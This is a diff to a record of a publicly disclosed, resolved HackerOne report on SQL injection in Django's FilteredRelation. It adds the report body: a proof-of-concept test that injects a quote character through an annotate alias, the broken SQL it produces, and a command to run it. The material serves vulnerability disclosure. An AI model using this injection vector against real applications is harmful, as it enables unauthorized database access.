@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "SQL Injection"
 enriched: true
+body: true
 date: 2025-09-15
 submitted: 2025-08-09T00:54:44.129Z
 bounty_usd: null
@@ -26,6 +27,46 @@ title: "SQL Injection when using FilteredRelation"
 - Report: [https://hackerone.com/reports/3292573](https://hackerone.com/reports/3292573)
 - CWE: SQL Injection
 - Submitted: 2025-08-09T00:54:44.129Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hi Django team :)
+
+Vulnerability location:
+https://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124
+
+You may create my POC function above the "test_select_related_foreign_key" function:
+```
+    def test_select_related_foreign_key_sqli(self):
+        user_data = "author_join2\""
+
+        qs = (
+            Book.objects.annotate(**{
+                user_data: FilteredRelation("author"),
+        })
+            .select_related(user_data)
+        )
+
+        qs._fetch_all()
+```
+
+SQL Query:
+`SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", author_join2"."id", author_join2"."name", author_join2"."content_type_id", author_join2"."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join2" ON ("filtered_relation_book"."author_id" = author_join2"."id")`
+
+{F4660052}
+
+To execute the SQLI  you may run:
+`python3 django/tests/runtests.py filtered_relation.tests.FilteredRelationTests.test_select_related_foreign_key_sqli`
+
+## Impact
+
+The impact is direct SQL Injection for any user with access to `select_related(` as above.
+
+I hope you have a great day!!!
+
+Eyal :)
 
 ## Timeline
 
